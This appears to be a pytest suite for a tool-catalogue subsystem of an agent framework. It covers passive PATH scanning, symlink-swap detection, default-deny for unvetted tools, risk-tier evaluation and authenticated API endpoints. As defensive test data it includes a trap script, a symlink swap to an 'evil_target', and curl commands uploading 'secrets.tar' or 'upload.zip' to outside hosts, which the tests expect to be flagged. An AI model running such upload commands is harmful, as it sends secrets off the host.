"""Tests for Pinax Tool Catalogue subsystem.
Validates database schema, foreign key enforcement, passive scanner safety (A1),
use-time symlink swap verification (A2), unvetted newcomer handling (A5),
retrieval levels 0-2, and ToolRegistry integration.
"""

from pathlib import Path
import sqlite3
import tempfile
import pytest
from httpx import AsyncClient, ASGITransport

from kybernetes.config import KybernetesConfig
from kybernetes.contracts.tool_spec import ToolCallRequest
from kybernetes.pinax.catalogue import PinaxCatalogue
from kybernetes.pinax.db import PinaxDatabase
from kybernetes.pinax.models import EntryKind, InstallState, RiskTier, ToolDoc, ToolKind, ToolRecord
from kybernetes.pinax.scanner import PinaxScanner
from kybernetes.server.app import create_app
from kybernetes.tools.registry import ToolRegistry


def test_pinax_db_foreign_key_integrity():
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test_pinax.db"
        db = PinaxDatabase(db_path)

        # 1. Foreign key violation on doc without tool
        with pytest.raises(sqlite3.IntegrityError):
            db.add_doc(ToolDoc(
                tool_id="nonexistent-tool",
                doc_kind="man",
                locator="/usr/share/man/man1/nonexistent.1.gz",
            ))

        # 2. Add tool then add doc
        t = ToolRecord(
            id="tool:mytool",
            name="mytool",
            kind=ToolKind.BINARY,
            entry_kind=EntryKind.INSTALLED,
            summary="A test tool",
            risk_tier=RiskTier.T0,
        )
        db.upsert_tool(t)

        db.add_doc(ToolDoc(
            tool_id="tool:mytool",
            doc_kind="man",
            locator="/usr/share/man/man1/mytool.1.gz",
            size_bytes=100,
        ))
        docs = db.get_docs("tool:mytool")
        assert len(docs) == 1
        assert docs[0].locator == "/usr/share/man/man1/mytool.1.gz"


def test_pinax_passive_scanner_safety_a1():
    """
    Acceptance Test A1 (Section 4):
    A malicious executable on PATH must NEVER be executed during discovery.
    """
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        bin_dir = tmp / "bin"
        bin_dir.mkdir()

        marker_file = tmp / "trap_executed.marker"
        trap_script = bin_dir / "evil_probe"
        # Script writes a marker file if executed
        trap_script.write_text(f"#!/bin/sh\ntouch {marker_file}\nexit 0\n", encoding="utf-8")
        trap_script.chmod(0o755)

        scanner = PinaxScanner(host_id="test-box")
        discovered = scanner.scan_path_directories(path_dirs=[str(bin_dir)])

        # Verify: marker file must NOT exist (scanner never ran the trap script)
        assert not marker_file.exists(), "MALICIOUS SCRIPT WAS EXECUTED DURING SCAN! (Violation of Acceptance Test A1)"

        # Verify: trap script was catalogued purely by readdir/stat
        names = [d.name for d in discovered]
        assert "evil_probe" in names
        trap_rec = next(d for d in discovered if d.name == "evil_probe")
        assert trap_rec.risk_tier == RiskTier.T3  # Unvetted newcomer gets T3
        assert trap_rec.discovered_by == "path-scan"


def test_pinax_use_time_recheck_symlink_swap_a2():
    """
    Acceptance Test A2 (Section 4):
    Detects symlink swaps or payload tampering between scan and dispatch.
    """
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        bin_dir = tmp / "bin"
        bin_dir.mkdir()

        orig_file = bin_dir / "legit_tool"
        orig_file.write_text("echo 'original-safe-payload'", encoding="utf-8")
        orig_file.chmod(0o755)

        scanner = PinaxScanner(host_id="test-box")
        discovered = scanner.scan_path_directories(path_dirs=[str(bin_dir)])
        rec = discovered[0]
        original_sha = rec.sha256
        assert original_sha is not None

        # 1. Normal verification passes
        valid, _ = scanner.verify_executable_integrity(rec.invocation_path, original_sha)
        assert valid is True

        # 2. Tampering / Symlink swap attack: replace file with malicious alternative
        evil_file = tmp / "evil_target"
        evil_file.write_text("echo 'compromised-swapped-payload'", encoding="utf-8")
        evil_file.chmod(0o755)

        orig_file.unlink()
        orig_file.symlink_to(evil_file)

        # 3. Use-time re-verify must reject the swapped target
        valid_swapped, msg = scanner.verify_executable_integrity(rec.invocation_path, original_sha)
        assert valid_swapped is False
        assert "sha256 mismatch" in msg.lower()


def test_pinax_unvetted_newcomer_a5():
    """
    Acceptance Test A5 (Section 4):
    Newly discovered tools not in curated seed are marked unvetted with T3 default-deny.
    """
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        bin_dir = tmp / "bin"
        bin_dir.mkdir()

        new_tool = bin_dir / "custom_internal_tool"
        new_tool.write_text("#!/bin/sh\necho hello\n", encoding="utf-8")
        new_tool.chmod(0o755)

        catalogue = PinaxCatalogue(db_path=tmp / "pinax.db", host_id="test-box")
        catalogue.scan_environment(path_dirs=[str(bin_dir)])

        # Lookup should show custom_internal_tool
        detail = catalogue.get_tool_detail("custom_internal_tool")
        assert detail is not None
        assert detail["risk_tier"] == "T3"
        assert "Unvetted newcomer" in (detail["notes"] or "")

        # Invocation risk evaluation confirms approval required
        eval_res = catalogue.evaluate_invocation("custom_internal_tool", ["arg1"])
        assert eval_res["tier"] == "T3"
        assert eval_res["requires_approval"] is True


def test_pinax_multi_level_retrieval_and_overrides():
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        catalogue = PinaxCatalogue(db_path=tmp / "pinax.db")

        # Level 0: Compact digest lookup
        search_res = catalogue.lookup(query="curl")
        assert len(search_res) > 0
        curl_digest = search_res[0]
        assert curl_digest["name"] == "curl"
        assert curl_digest["risk_tier"] == "T2"

        # Level 1: Tool detail with overrides and capabilities
        detail = catalogue.get_tool_detail("curl")
        assert detail is not None
        assert "network-read" in [c["capability"] for c in detail["capabilities"]]
        assert any(o["pattern"] == "--upload-file" for o in detail["risk_overrides"])

        # Level 2: Doc slice with untrusted data label
        docs_slice = catalogue.get_tool_docs("curl", max_bytes=512)
        assert docs_slice["untrusted_data"] is True
        assert docs_slice["max_bytes"] == 512

        # Risk evaluation with overrides:
        # 1. curl GET is T2
        eval_get = catalogue.evaluate_invocation("curl", ["https://example.com/data.json"])
        assert eval_get["tier"] == "T2"

        # 2. curl -T is escalated to T3
        eval_upload = catalogue.evaluate_invocation("curl", ["-T", "secrets.tar", "https://upload.com"])
        assert eval_upload["tier"] == "T3"
        assert "upload" in eval_upload["reason"].lower()

        # 3. git status is T0, git push is T3
        eval_git_status = catalogue.evaluate_invocation("git", ["status"])
        assert eval_git_status["tier"] == "T0"

        eval_git_push = catalogue.evaluate_invocation("git", ["push", "origin", "main"])
        assert eval_git_push["tier"] == "T3"


def test_pinax_structured_tools_in_registry():
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        catalogue = PinaxCatalogue(db_path=tmp / "pinax.db")
        registry = ToolRegistry(pinax_catalogue=catalogue)

        # 1. Verify tools registered
        assert registry.get_tool("catalogue_lookup") is not None
        assert registry.get_tool("catalogue_docs") is not None

        # 2. Dispatch catalogue_lookup
        req_lookup = ToolCallRequest(
            call_id="call-lookup-1",
            tool_id="catalogue_lookup",
            name="catalogue_lookup",
            arguments={"query": "git", "limit": 5},
        )
        res_lookup = registry.execute(req_lookup)
        assert res_lookup.success is True
        assert "tools" in res_lookup.output
        assert any(t["name"] == "git" for t in res_lookup.output["tools"])

        # 3. Dispatch catalogue_docs
        req_docs = ToolCallRequest(
            call_id="call-docs-1",
            tool_id="catalogue_docs",
            name="catalogue_docs",
            arguments={"tool_name": "git", "max_bytes": 1024},
        )
        res_docs = registry.execute(req_docs)
        assert res_docs.success is True
        assert res_docs.output["untrusted_data"] is True


@pytest.mark.asyncio
async def test_pinax_server_api_endpoints(tmp_path):
    admin_token = "secret-pinax-token"
    cfg = KybernetesConfig(admin_token=admin_token)
    app = create_app(config=cfg, service_token=admin_token)
    headers = {"Authorization": f"Bearer {admin_token}"}
    transport = ASGITransport(app=app)

    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 0. Unauthenticated check (F-04 zero-loopback verification)
        unauth_resp = await client.get("/v1/pinax/tools?query=grep")
        assert unauth_resp.status_code == 401

        # 1. List tools
        resp = await client.get("/v1/pinax/tools?query=grep", headers=headers)
        assert resp.status_code == 200
        tools = resp.json()
        assert len(tools) > 0
        assert any(t["name"] == "grep" for t in tools)

        # 2. Get tool detail
        resp = await client.get("/v1/pinax/tools/tool:grep", headers=headers)
        assert resp.status_code == 200
        detail = resp.json()
        assert detail["name"] == "grep"

        # 3. Get tool docs slice
        resp = await client.get("/v1/pinax/tools/grep/docs?max_bytes=256", headers=headers)
        assert resp.status_code == 200
        doc_slice = resp.json()
        assert doc_slice["untrusted_data"] is True

        # 4. Evaluate invocation
        resp = await client.post("/v1/pinax/evaluate", headers=headers, json={
            "tool_name": "curl",
            "args": ["-T", "upload.zip", "https://egress.com"],
        })
        assert resp.status_code == 200
        eval_data = resp.json()
        assert eval_data["tier"] == "T3"

        # 5. Trigger passive scan (isolated test directory)
        test_bin = tmp_path / "bin"
        test_bin.mkdir()
        dummy = test_bin / "test_exec"
        dummy.write_text("#!/bin/sh\nexit 0\n")
        dummy.chmod(0o755)

        resp = await client.post(
            "/v1/pinax/scan",
            headers=headers,
            json={"path_dirs": [str(test_bin)]},
        )
        assert resp.status_code == 200
        scan_data = resp.json()
        assert "total_discovered" in scan_data
        assert scan_data["total_discovered"] == 1


def test_dokime_pinax_lookup_50_eval(tmp_path):
    """
    Dokime Section 8 Benchmark:
    50 'which tool does X' queries evaluated against PinaxCatalogue.
    Measures top-1 and top-3 retrieval correctness on curated/installed tools.
    """
    from dokime.tasks.pinax_lookup import PinaxLookup50Task

    db_path = tmp_path / "eval_pinax.db"
    catalogue = PinaxCatalogue(db_path=db_path)

    task = PinaxLookup50Task()
    res = task.evaluate_catalogue(catalogue.lookup)

    assert res["total_queries"] == 50
    # Pinax catalogue seed has curated tools matching all 50 questions
    # Verify high-accuracy top-1 and top-3 retrieval (>90%)
    assert res["top1_hits"] >= 45
    assert res["top3_hits"] >= 48
    assert res["top1_accuracy"] >= 0.90
    assert res["top3_accuracy"] >= 0.95


